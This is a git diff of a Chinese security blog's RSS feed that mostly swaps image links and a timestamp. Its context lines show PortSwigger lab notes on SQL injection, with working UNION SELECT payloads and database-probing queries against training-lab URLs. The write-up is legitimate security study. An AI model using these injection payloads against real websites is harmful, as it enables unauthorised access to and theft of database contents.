@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 07:24:11 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>微信小程序抓包和并发漏洞</title><link>https://P7IVESC.github.io/post/wei-xin-xiao-cheng-xu-zhua-bao-he-bing-fa-lou-dong.html</link><description>![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cce03a62bf16.png)
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 07:33:57 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>微信小程序抓包和并发漏洞</title><link>https://P7IVESC.github.io/post/wei-xin-xiao-cheng-xu-zhua-bao-he-bing-fa-lou-dong.html</link><description>![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cce03a62bf16.png)
 
 ![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3337ab167a04.png)
 
@@ -77,11 +77,11 @@ edu信息收集\-社交媒体
 
 哪怕只有一条也算，只要是官网发的。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/xin-xi-shou-ji.html</guid><pubDate>Fri, 06 Nov 2026 06:27:47 +0000</pubDate></item><item><title>PortSwigger 靶场练习笔记</title><link>https://P7IVESC.github.io/post/PortSwigger%20-ba-chang-lian-xi-bi-ji.html</link><description># SQLI
 
-## https://portswigger\.net/web\-security/sql\-injection/lab\-retrieve\-hidden\-data
+## https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
 找到注入点
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGEyNTMyNGQ5YjhmMzgyMWVkYTkwM2QyMDhjNWE4ZGFfZGQxNzAzZWQ2MzU4YTZkMTQ5NmVmY2Q2YzkxYzBlZTRfSUQ6NzY2ODE0MDQwMTgzNjU3NTcxMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8d24667f5537.webp)
 
 ```Plain Text
 https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=
@@ -91,9 +91,9 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 
 由于union联合查询需要列数匹配，所以我们先用order by判断字段数
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGM3OGRmMjAzYTA2NmIxODFjZWI0MDk4NTdkNWE0M2FfNDFlYjJiYTY4YWIyZTNhMmE5ZWM4M2NhNzcwY2YyZWRfSUQ6NzY2ODE0MDc5MzkwMzUwMDU4NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ece2d32ef410.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmFkMDhjZGFkOTNmMDU4MTlhYmQ1YWNmMDNiZWE4OWNfYTI5ZTY2ODNmODVkYjViMjI4YzA3MzNmNDZmMWVjNjlfSUQ6NzY2ODE0MDg3NDI4Mjg2MzU5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a8e70afe9dd.webp)
 
 直到9时服务器报错，证明有八个字段值
 
@@ -103,7 +103,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 
 这边以eshop的Category表为例，这边where条件如果是字符类型，后面union如果是数字型，就会报错
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTk4MGExYjkxN2FiMTFhZDI1YzM2NTBmN2M0N2EzMGRfZmU5MDc3MmY3ZTJkYTgyMjJjY2VhZWEzMjk0ODFlYjlfSUQ6NzY2ODE0Mjc0MjUxNzc2MzAzNF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4177e211d71a.webp)
 
 所以判断回显位置的payload应该是
 
@@ -111,7 +111,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=' union select '1','2','3','4','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWM5NmRhYTQwMWZiMjY1NmFmZDYwNjNkMDhlNmZiYWVfYzMxYmE5Y2MyZjJmY2Q5YWVhYzgxODUwZGQ3MjVkZTlfSUQ6NzY2ODE0MzA0Njg1MzEzNTMzOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0b3022d15774.webp)
 
 确定3为回显位置，于是开始确定数据库
 
@@ -143,7 +143,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 1' union select '1','2',current_database(),'4','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzlhMWI3N2JlYzliY2E4ZGMzN2VjZTQ0YWI3MTBiYzFfNDE3ZjViNGQwNWY4Njk2ODBiZGNhZDUwNzc1NTRmMGVfSUQ6NzY2ODE0NjIyMDI4NDYxMTU1N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/05c8b4aa69d4.webp)
 
 这边只有current\_database\(\)正常返回，推断靶场使用的是**PostgreSQL数据库，当前数据库名是“academy\_labs”**
 
@@ -153,7 +153,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?category=1'+union+select+'1','2',version(),'4  ','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTllNjE0MWIyNTEzMWJiMDNiODMzMzZlMGQ2OTUzYzdfODU2ODJkMzRhMjhmMGMxZjY5YjlkYjY1ZTkwMGM3YmJfSUQ6NzY2ODIwNDg2ODM4MTQ0NTA2NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/67c2c91a152b.webp)
 
 
 
@@ -165,7 +165,7 @@ https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?categor
 
 先来看看information\_schema数据库tables表的结构，以查询mysql中的world表名为例
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjAzYjQwNzY5NjdhZDMwY2RkN2E1MDE3NGI2MzhmYjNfYzNjOWViNTc5NDkxNzFjN2ExMDI4NTY2M2EzMDY0ZGJfSUQ6NzY2ODE1MzE0ODAyODczNDY2Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a1c314313397.webp)
 
 我们可以看到该表中存在两个字段，一个是TABLE\_SCHEMA存放的所有的数据库名，TABLE\_NAME存放了所有的表名
 
@@ -175,7 +175,7 @@ https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?categor
 select table_name from information_schema.TABLES where table_schema='world';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDBmZmYxMTk3NTExODdjNTg3MDg0OGFmMjY0MmMxY2NfMTRiZWIwNTdhMmU0YzAyMTNmMjBhNGI1ZjM4YjE5NDZfSUQ6NzY2ODE1NTQzMTA5NzA3NzAwMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2246bfeac76a.webp)
 
 因为只有一个回显位置，所以我们可以使用group\_concat\(\)将查询结构合并为一个字符串
 
@@ -183,7 +183,7 @@ select table_name from information_schema.TABLES where table_schema='world';
 select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schema='world';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Njk2ZjlkMmY0NjA0OGI3YTU5MDcxNjlkYzZmZGY0ZjdfNDU2MmQyN2ViMGQ2ZDMyNGJkZmQ1ZDc2MmZhNGRjOTNfSUQ6NzY2ODE1NTE4MDc4MTQyMzg1Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fac9a70feff.webp)
 
 
 
